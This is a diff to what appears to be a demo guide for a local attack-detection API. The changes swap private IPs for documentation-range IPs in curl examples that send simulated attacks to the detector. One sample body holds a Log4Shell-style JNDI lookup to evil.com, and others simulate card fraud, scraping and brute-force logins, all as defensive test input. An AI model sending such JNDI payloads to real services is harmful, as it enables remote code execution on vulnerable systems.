@@ -88,7 +88,7 @@ Run this command in terminal:
 ```bash
 curl -X POST http://localhost:8000/analyze \
   -H "Content-Type: application/json" \
-  -d '{"features":{"method":"POST","path":"/api/exploit","query":"","body":"{\"cmd\":\"${jndi:ldap://evil.com/a}\"}","client_ip":"192.168.1.100","user_agent":"Test","requests_per_minute":10,"content_length":50,"query_param_count":0,"header_count":5,"hour_of_day":14},"context":{}}'
+  -d '{"features":{"method":"POST","path":"/api/exploit","query":"","body":"{\"cmd\":\"${jndi:ldap://evil.com/a}\"}","client_ip":"203.0.113.100","user_agent":"Test","requests_per_minute":10,"content_length":50,"query_param_count":0,"header_count":5,"hour_of_day":14},"context":{}}'
 ```
 
 Talking points:
@@ -152,7 +152,7 @@ Color-coded by severity:
 # Simulate credit card theft attempt
 curl -X POST http://localhost:8000/analyze \
   -H "Content-Type: application/json" \
-  -d '{"features":{"method":"POST","path":"/checkout","body":"{\"cc\":\"4111111111111111\",\"cvv\":\"123\",\"exp\":\"12/25\",\"amount\":-1000}","client_ip":"192.168.1.50","user_agent":"Bot","requests_per_minute":50,"content_length":100,"query_param_count":0,"header_count":5,"hour_of_day":3},"context":{"failed_attempts":10}}'
+  -d '{"features":{"method":"POST","path":"/checkout","body":"{\"cc\":\"4111111111111111\",\"cvv\":\"123\",\"exp\":\"12/25\",\"amount\":-1000}","client_ip":"203.0.113.50","user_agent":"Bot","requests_per_minute":50,"content_length":100,"query_param_count":0,"header_count":5,"hour_of_day":3},"context":{"failed_attempts":10}}'
 ```
 
 ### Scenario 2: API Abuse
@@ -161,7 +161,7 @@ curl -X POST http://localhost:8000/analyze \
 for i in {1..30}; do
   curl -X POST http://localhost:8000/analyze \
     -H "Content-Type: application/json" \
-    -d '{"features":{"method":"GET","path":"/api/data","query":"limit=999999","client_ip":"192.168.1.100","user_agent":"Scraper","requests_per_minute":500,"content_length":0,"query_param_count":1,"header_count":3,"hour_of_day":14},"context":{}}' &
+    -d '{"features":{"method":"GET","path":"/api/data","query":"limit=999999","client_ip":"203.0.113.100","user_agent":"Scraper","requests_per_minute":500,"content_length":0,"query_param_count":1,"header_count":3,"hour_of_day":14},"context":{}}' &
 done
 ```
 
@@ -171,7 +171,7 @@ done
 for i in {1..10}; do
   curl -X POST http://localhost:8000/analyze \
     -H "Content-Type: application/json" \
-    -d "{\"features\":{\"method\":\"POST\",\"path\":\"/login\",\"body\":\"{\\\"username\\\":\\\"user$i\\\",\\\"password\\\":\\\"pass$i\\\"}\",\"client_ip\":\"192.168.1.200\",\"user_agent\":\"BruteForce\",\"requests_per_minute\":100,\"content_length\":50,\"query_param_count\":0,\"header_count\":5,\"hour_of_day\":2},\"context\":{\"failed_attempts\":$i}}"
+    -d "{\"features\":{\"method\":\"POST\",\"path\":\"/login\",\"body\":\"{\\\"username\\\":\\\"user$i\\\",\\\"password\\\":\\\"pass$i\\\"}\",\"client_ip\":\"203.0.113.200\",\"user_agent\":\"BruteForce\",\"requests_per_minute\":100,\"content_length\":50,\"query_param_count\":0,\"header_count\":5,\"hour_of_day\":2},\"context\":{\"failed_attempts\":$i}}"
   sleep 0.5
 done
 ```
